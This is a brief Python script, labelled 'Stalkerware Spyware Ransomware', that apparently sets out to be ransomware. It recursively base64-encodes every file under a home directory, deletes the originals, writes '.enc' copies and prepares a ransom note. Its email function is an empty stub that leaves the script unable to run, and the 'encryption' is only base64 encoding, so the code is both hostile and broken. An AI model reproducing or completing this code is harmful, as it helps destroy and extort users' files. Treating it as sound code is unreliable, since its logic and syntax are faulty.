import os, time, shutil, base64, sqlite3, subprocess

# Stalkerware Spyware Ransomware

def encrypt(file_path: str) -> None:
    with open(file_path, "rb") as f:
        data = f.read()
    
    encrypted_data = base64.b64encode(data)
    os.remove(file_path)

    new_file_path = file_path + ".enc"
    with open(new_file_path, "wb") as f:
        f.write(encrypted_data)

def encrypt_directory(directory_path: str) -> None:
    for root, _, files in os.walk(directory_path):
        for file in files:
            encrypt(os.path.join(root, file))

def ransome_note() -> str:
    return """
Your device has been encrypted by a stalkerware ransomware. To unlock your files, please contact the sender.

- Stalkerware Team
"""

def send_email(subject: str, body: str) -> None:
    # code for sending email with the ransom note and encryption keys

def main() -> None:
    encrypt_directory("/home/username")
    
    time.sleep(10)
    send_email("Your device has been encrypted", ransome_note())

if __name__ == "__main__":
    main()
